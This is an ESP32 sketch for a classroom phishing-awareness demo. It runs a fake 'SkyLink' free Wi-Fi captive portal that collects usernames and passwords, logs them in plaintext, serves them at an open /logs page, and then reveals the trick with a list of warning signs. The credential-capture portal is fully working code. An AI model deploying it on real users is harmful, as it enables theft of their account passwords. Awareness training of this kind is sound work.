// realistic_portal_reveal.ino
// Realistic (fictional-brand) captive portal that reveals itself after submit.
// Classroom awareness demo — consent required, test data only.

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SPIFFS.h>

const char* ap_ssid = "SkyLink_Free_WiFi";   // fictional brand, not a real company
DNSServer dnsServer;
WebServer webServer(80);
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);

void logEvent(String info) {
  File f = SPIFFS.open("/log.txt", FILE_APPEND);
  if (f) { f.println(info); f.close(); }
  Serial.println(info);
}

String htmlEscape(String s) {
  s.replace("&", "&amp;");
  s.replace("<", "&lt;");
  s.replace(">", "&gt;");
  s.replace("\"", "&quot;");
  return s;
}

// --- Shared page styling: clean, modern, "real enough" ---
String css() {
  return
  "<style>"
  "*{box-sizing:border-box;margin:0;padding:0}"
  "body{font-family:-apple-system,Segoe UI,Roboto,sans-serif;background:linear-gradient(135deg,#1e3a8a,#2563eb);"
  "min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;color:#0f172a}"
  ".card{background:#fff;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.3);width:100%;max-width:380px;overflow:hidden}"
  ".head{background:#2563eb;color:#fff;padding:26px 24px;text-align:center}"
  ".logo{font-size:22px;font-weight:700;letter-spacing:.5px}"
  ".logo span{opacity:.85;font-weight:400}"
  ".sub{font-size:13px;opacity:.9;margin-top:4px}"
  ".body{padding:24px}"
  "h2{font-size:17px;margin-bottom:4px}"
  ".muted{color:#64748b;font-size:13px;margin-bottom:18px}"
  "label{display:block;font-size:12px;color:#475569;margin:12px 0 4px}"
  "input[type=text],input[type=password]{width:100%;padding:12px;border:1px solid #cbd5e1;border-radius:8px;font-size:15px}"
  "input:focus{outline:none;border-color:#2563eb}"
  ".terms{display:flex;align-items:flex-start;gap:8px;margin:16px 0;font-size:12px;color:#475569}"
  ".btn{width:100%;background:#2563eb;color:#fff;border:0;padding:13px;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin-top:6px}"
  ".btn:hover{background:#1d4ed8}"
  ".foot{text-align:center;font-size:11px;color:#94a3b8;padding:14px}"
  ".reveal{padding:26px}"
  ".reveal h2{color:#b91c1c;font-size:20px;margin-bottom:10px}"
  ".flag{background:#fef2f2;border-left:4px solid #dc2626;padding:10px 12px;border-radius:6px;margin:10px 0;font-size:13px}"
  ".flag b{color:#b91c1c}"
  ".captured{background:#0f172a;color:#4ade80;font-family:ui-monospace,Consolas,monospace;padding:12px 14px;border-radius:8px;margin:12px 0 16px;font-size:13px;word-break:break-all}"
  ".captured b{color:#94a3b8;font-weight:400}"
  ".ok{background:#f0fdf4;border-left:4px solid #16a34a;padding:10px 12px;border-radius:6px;margin:14px 0;font-size:13px}"
  "a{color:#2563eb;text-decoration:none}"
  "</style>";
}

// --- The convincing login page ---
void handlePortal() {
  logEvent("PORTAL VIEW from " + webServer.client().remoteIP().toString());
  String h = "<!doctype html><html><head><meta charset='utf-8'>";
  h += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
  h += "<title>SkyLink Free WiFi</title>" + css() + "</head><body><div class='card'>";
  h += "<div class='head'><div class='logo'>Sky<span>Link</span></div>";
  h += "<div class='sub'>Complimentary High-Speed Internet</div></div>";
  h += "<div class='body'><h2>Sign in to continue</h2>";
  h += "<p class='muted'>Connect with your account to access free Wi-Fi.</p>";
  h += "<form action='/submit' method='POST'>";
  h += "<label>Email or username</label>";
  h += "<input type='text' name='username' placeholder='you@example.com' required>";
  h += "<label>Password</label>";
  h += "<input type='password' name='password' placeholder='Password' required>";
  h += "<div class='terms'><input type='checkbox' checked required>";
  h += "<span>I agree to the SkyLink Terms of Service and Acceptable Use Policy.</span></div>";
  h += "<button class='btn' type='submit'>Connect to Wi-Fi</button></form></div>";
  h += "<div class='foot'>Powered by SkyLink Networks · Secure Connection</div>";
  h += "</div></body></html>";
  webServer.send(200, "text/html", h);
}

// --- The REVEAL, shown right after they "log in" ---
void handleSubmit() {
  String ip = webServer.client().remoteIP().toString();
  String user = webServer.arg("username");
  String pass = webServer.arg("password");
  // NOTE: this classroom demo only ever sees TEST data students type in --
  // never use a real account password here.
  logEvent("SUBMIT from " + ip + " | username=" + user + " | password=" + pass);

  String h = "<!doctype html><html><head><meta charset='utf-8'>";
  h += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
  h += "<title>Reveal</title>" + css() + "</head><body><div class='card'><div class='reveal'>";
  h += "<h2>⚠ That was a FAKE Wi-Fi login.</h2>";
  h += "<p class='muted'>You just handed your credentials to a $5 microcontroller. "
       "Here's exactly what it captured:</p>";
  h += "<div class='captured'><b>username:</b> " + htmlEscape(user) + "<br><b>password:</b> " + htmlEscape(pass) + "</div>";
  h += "<p class='muted'>In a real attack, they'd be gone. Here's how you could have known:</p>";
  h += "<div class='flag'><b>1. It's an OPEN network.</b> \"Free WiFi\" with no password means "
       "anyone can run it — including an attacker.</div>";
  h += "<div class='flag'><b>2. A login page popped up on its own.</b> Legit free Wi-Fi rarely asks "
       "for your <i>email account</i> password — only its own guest code, if anything.</div>";
  h += "<div class='flag'><b>3. No real HTTPS / no real domain.</b> The address was 192.168.4.1, "
       "not a company you can verify. No padlock you can trust.</div>";
  h += "<div class='flag'><b>4. It asked for a password it never needs.</b> Why would airport Wi-Fi "
       "need your <i>email</i> password to give you internet?</div>";
  h += "<div class='ok'><b>What to do:</b> Never enter real account passwords into a Wi-Fi login. "
       "Turn off auto-join for open networks. Use mobile data + a VPN for anything sensitive.</div>";
  h += "<p class='muted'>This was a classroom demo — only ever type <b>test</b> data into it. "
       "In a real attack, that captured password would now be in the attacker's hands, ready to use.</p>";
  h += "<p style='margin-top:14px'><a href='/'>← See the fake page again</a></p>";
  h += "</div></div></body></html>";
  webServer.send(200, "text/html", h);
}

void handleLogs() {
  File f = SPIFFS.open("/log.txt", FILE_READ);
  String content = "No logs yet.";
  if (f) { content = f.readString(); f.close(); }
  webServer.send(200, "text/plain", content);
}

void setup() {
  Serial.begin(115200);
  SPIFFS.begin(true);
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid);
  dnsServer.start(DNS_PORT, "*", apIP);
  webServer.onNotFound(handlePortal);
  webServer.on("/", handlePortal);
  webServer.on("/submit", HTTP_POST, handleSubmit);
  webServer.on("/logs", handleLogs);
  webServer.begin();
  logEvent("=== New session started ===");
  Serial.println("SkyLink portal up. Connect to 'SkyLink_Free_WiFi'.");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
